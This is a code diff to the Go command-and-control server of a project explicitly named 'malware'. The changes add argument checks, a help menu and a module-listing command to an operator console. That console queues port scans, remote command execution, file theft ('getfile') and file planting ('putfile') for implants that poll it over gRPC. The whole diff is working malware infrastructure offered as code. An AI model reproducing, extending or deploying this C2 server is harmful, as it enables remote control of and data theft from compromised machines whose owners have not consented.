@@ -3,13 +3,9 @@ package main
 import (
 	"context"
 	"fmt"
-	"github.com/chzyer/readline"
-	"google.golang.org/grpc"
-	"google.golang.org/grpc/credentials"
 	"io"
 	"io/ioutil"
 	"log"
-	"malware/common"
 	pb "malware/common/messages"
 	"malware/common/types"
 	"net"
@@ -17,6 +13,10 @@ import (
 	"strconv"
 	"strings"
 	"time"
+
+	"github.com/chzyer/readline"
+	"google.golang.org/grpc"
+	"google.golang.org/grpc/credentials"
 )
 
 type c2 struct {
@@ -42,50 +42,95 @@ func (c2 *c2) CheckCommandQueue(_ context.Context, req *pb.CheckCmdRequest) (*pb
 	case *pb.CheckCmdRequest_Heartbeat:
 		select {
 		case x, ok := <-c2.queue:
-			fmt.Println(x)
 			if ok {
 				return x, nil
 			} else {
-				common.Panic("QUeue closed")
+				panic("Queue closed")
 			}
 		default:
 		}
 	case *pb.CheckCmdRequest_Reply:
 		c2.handleReply(u.Reply)
 	default:
-		common.Panic("Didn't receive a valid message", req, u)
+		fmt.Println(req, u)
+		panic("Didn't received a valid message")
 	}
 	return &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Heartbeat{Heartbeat: time.Now().Unix()}}, nil
+}
+
+func (c2 *c2) help() {
+	c2.writeString("Commands: (If module is enabled)")
+	c2.writeString("\tlist                      -> List enabled modules")
+	c2.writeString("\tportscan <ip> <from> <to> -> Scan ports")
+	c2.writeString("\texec <cmd>                -> Exec command")
+	c2.writeString("\tgetfile <filename>        -> Get file from server")
+	c2.writeString("\tputfile <local> <remote>  -> Put file from server")
 }
 
 func (c2 *c2) handle(text string) {
 	parts := strings.Split(strings.TrimSpace(text), " ")
 	switch parts[0] {
 	case "portscan":
-		start, _ := strconv.Atoi(parts[2])
-		end, _ := strconv.Atoi(parts[3])
+		if len(parts) != 4 {
+			fmt.Println("Incorrect usage")
+			c2.help()
+			return
+		}
+		start, err := strconv.Atoi(parts[2])
+		if err != nil {
+			fmt.Println("Incorrect usage")
+			c2.help()
+			return
+		}
+		end, err := strconv.Atoi(parts[3])
+		if err != nil {
+			fmt.Println("Incorrect usage")
+			c2.help()
+			return
+		}
+
 		message := &pb.PortScan{Ip: parts[1], StartPort: int32(start), EndPort: int32(end)}
 		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Portscan{Portscan: message}}
 	case "exec":
+		if len(parts) != 2 {
+			fmt.Println("Incorrect usage")
+			c2.help()
+			return
+		}
 		message := &pb.Exec{Exec: parts[1], Args: parts[2:]}
 		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Exec{Exec: message}}
 	case "getfile":
+		if len(parts) != 2 {
+			fmt.Println("Incorrect usage")
+			c2.help()
+			return
+		}
 		message := &pb.GetFile{Filename: parts[1]}
 		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Getfile{Getfile: message}}
 	case "putfile":
-		out, err := ioutil.ReadFile(parts[2])
-		if err != nil {
-			common.Panicf(err, "Erroring loading file")
+		if len(parts) != 3 {
+			fmt.Println("Incorrect usage")
+			c2.help()
+			return
 		}
-		message := &pb.UploadFile{Filename: parts[1], Contents: out}
+		out, err := ioutil.ReadFile(parts[1])
+		if err != nil {
+			fmt.Println("Can't find file: " + parts[1])
+			return
+		}
+		message := &pb.UploadFile{Filename: parts[2], Contents: out}
 		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Uploadfile{Uploadfile: message}}
+	case "list":
+		message := &pb.ListModules{}
+		c2.queue <- &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Listmodules{Listmodules: message}}
+	case "help":
+		c2.help()
 	default:
-		c2.term.Write([]byte("Cmd not found: "))
-		c2.term.Write([]byte(parts[0] + "\n"))
+		c2.writeString("Cmd not found: " + parts[0] + "\n")
 	}
 }
-func (c2 *c2) ReadUserInput() {
 
+func (c2 *c2) ReadUserInput() {
 	for {
 		line, err := c2.term.Readline()
 		if err == readline.ErrInterrupt {
@@ -117,9 +162,6 @@ var completer = readline.NewPrefixCompleter(
 )
 
 func main() {
-	// TODO: Replace with %PORT%
-	// TODO: Replacewith %certfile% %keyfile%
-
 	if len(os.Args) != 3 {
 		panic("Require Cert and Key as argument")
 	}
@@ -152,7 +194,7 @@ func main() {
 	listener, err := net.Listen("tcp", host)
 
 	if err != nil {
-		common.Panicf(err, "Hosting on %s failed", host)
+		panic(err)
 	}
 
 	defer listener.Close()
